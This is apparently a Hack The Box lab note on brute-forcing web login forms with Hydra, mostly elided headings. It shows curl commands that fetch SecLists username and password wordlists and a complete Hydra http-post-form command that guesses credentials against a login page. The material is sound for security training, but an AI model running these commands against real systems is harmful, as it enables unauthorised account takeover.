...
## <mark style="color:red;">Login Forms</mark>
...
### <mark style="color:blue;">Understanding Login Forms</mark>
...
### <mark style="color:blue;">A Basic Login Form Example</mark>
...
### <mark style="color:blue;">http-post-form</mark>
...
{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
```
{% endcode %}

#### <mark style="color:green;">Understanding the Condition String</mark>
...
#### <mark style="color:green;">Manual Inspection</mark>
...
#### <mark style="color:green;">Browser Developer Tools</mark>
...
#### <mark style="color:green;">Proxy Interception</mark>
...
### <mark style="color:blue;">Constructing the params String for Hydra</mark>
...
mrroboteLiot@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
mrroboteLiot@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt
# Hydra command
mrroboteLiot@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
...
{% hint style="info" %}
**hydra -L top-usernames-shortlist.txt -P 2023-200\_most\_used\_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^\&password=^PASS^:F=Invalid credentials"**
{% endhint %}
